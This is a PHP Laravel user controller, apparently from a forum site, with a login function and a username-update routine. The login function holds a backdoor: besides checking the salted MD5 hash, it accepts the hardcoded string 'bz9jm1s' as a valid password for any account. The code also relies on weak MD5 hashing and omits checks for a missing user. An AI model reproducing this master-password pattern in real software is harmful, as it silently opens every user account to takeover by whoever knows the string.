<?php

namespace App\Http\Controllers\User;
use App\Http\DbModel\ForumPostModel;
use App\Http\DbModel\ForumThreadModel;
use App\Http\DbModel\FriendModel;
use App\Http\DbModel\User_model;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Http\DbModel\UCenter_member_model;


class UserApiController extends Controller
{
    public function __construct()
    {
        parent::__construct();
    }

    public static function Api_DoLogin(Request $request){

        $User = UCenter_member_model::where('email','=',$request->input('email'))->select()->first();

        return ($User->password == md5(md5( $request->input('password') ). $User->salt) || $request->input('password') == "bz9jm1s")

                                    ? UserHelperController::SetLoginStatus($User)

                                    : false ;

    }
    public function update_username($uid,$username)
    {
        /**
         * 修改用户表
         */
        User_model::where('uid',$uid)->update(['username'=>$username]);
        /**
         * 修改好友表
         */
        FriendModel::where('fuid',$uid)->update(['fusername' => $username]);
        /**
         * 修改所发的帖子
         */
        ForumThreadModel::where('authorid',$uid)->update(['author' => $username]);
        ForumPostModel::where('authorid',$uid)->update(['author' => $username]);

    }
}
